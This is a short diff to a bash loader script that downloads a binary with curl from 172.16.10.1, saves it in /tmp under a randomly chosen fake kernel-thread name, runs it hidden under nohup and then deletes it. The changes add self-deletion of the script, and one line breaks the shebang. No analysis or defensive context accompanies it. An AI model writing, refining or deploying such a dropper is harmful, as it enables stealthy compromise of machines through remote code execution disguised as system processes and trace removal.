@@ -1,4 +1,4 @@
-#!/bin/bash
+!/bin/bash
 WORK_DIR="/tmp"
 RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]" "[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")
 RANDOMIZE=$(( (RANDOM % 7)  + 0))
@@ -9,7 +9,7 @@ if command -v curl 1> /dev/null; then
     curl -s "http://172.16.10.1/system_sleep" -o "${FULL_BIN_PATH}"
     chmod +x "${FULL_BIN_PATH}"
     export PATH="${WORK_DIR}:${PATH}"
-    cd /tmp
-    nohup ${BIN_FILE} &> /dev/null &
-    rm -- ${FULL_BIN_PATH}
+    nohup "${BIN_FILE}" &> /dev/null &
+    sleep 2 
+    rm -- "${FULL_BIN_PATH}" "$(basename $0)"
 fi
